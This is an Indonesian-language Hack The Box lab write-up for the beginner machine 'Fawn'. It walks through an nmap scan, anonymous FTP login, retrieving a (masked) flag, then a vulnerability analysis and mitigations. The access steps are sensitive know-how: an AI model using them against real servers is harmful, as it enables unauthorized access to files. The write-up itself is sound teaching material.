# HTB Starting Point - Fawn (Writeup)

**Platform:** Hack The Box - Starting Point  
**Tier:** 0 (Pemula)  
**Kategori:** FTP / Anonymous Login  

---

# Ringkasan
Mesin *Fawn* mengajarkan cara melakukan scanning port menggunakan Nmap, menemukan service FTP, lalu mengeksploitasi kesalahan konfigurasi yaitu FTP mengizinkan **anonymous login**.  
Dengan akses ini, attacker dapat membaca file di server dan menemukan flag.

---

# Tools yang Digunakan
- Nmap
- FTP Client (`ftp`)
- Linux Command Line

---
# Informasi Target
- **Nama Mesin:** Fawn
- **IP Target:** 10.129.153.192

---

# 1. Reconnaissance (Scanning)

Langkah pertama adalah melakukan scanning untuk melihat port yang terbuka.

Command:
```bash
nmap -sC -sV 10.129.153.192
```

Hasil penting yang ditemukan:
- 21/tcp open ftp

*Artinya target menjalankan service FTP pada port 21.*

# 2. Enumeration

FTP adalah protokol untuk transfer file.
Beberapa server FTP salah konfigurasi dan mengizinkan user login sebagai anonymous, yang artinya siapa saja dapat masuk tanpa kredensial valid.

**Karena FTP terbuka, langkah selanjutnya adalah mencoba login.**

Command:
```bash
ftp 10.129.153.192
```

# 3. Exploitation (Anonymous Login)

Saat diminta username, digunakan:
```bash
Username:
anonymous

Password:
anonymous

[atau bisa juga password kosong (langsung ENTER).]
```
**Jika login berhasil, berarti FTP server mengizinkan anonymous access.**

# 4. Mencari File Flag

Setelah berhasil login FTP, lakukan listing file:
```bash
ls
```

Biasanya ada file seperti:
```bash
flag.txt
```
Jika file ditemukan, download atau langsung baca.

Download file:
```bash
get flag.txt
```

Keluar dari FTP:
```bash
bye
```

Setelah file berhasil di-download, baca isi file:
```bash
cat flag.txt
```

**Flag akan muncul.**
```bash
HTB{*******************************}
```


# 5. Analisis Kerentanan
**Penyebab Masalah**

*FTP server mengizinkan anonymous login, sehingga attacker bisa mengakses file tanpa autentikasi yang valid.*

**Kategori masalah:**

- Misconfiguration
- Unauthorized Access
- Weak Access Control

**Dampak**

Jika server asli menggunakan konfigurasi seperti ini, attacker dapat:

- membaca file penting
- mengambil konfigurasi sistem
- mencuri data sensitif
- mencari kredensial untuk akses lebih lanjut

# 6. Mitigasi (Rekomendasi Keamanan)

**Solusi untuk administrator:**

- Nonaktifkan anonymous login di FTP
- Gunakan autentikasi user yang kuat
- Gunakan protokol yang lebih aman seperti SFTP (SSH File Transfer Protocol)
- Batasi akses file dengan permission
- Tutup port FTP jika tidak dibutuhkan
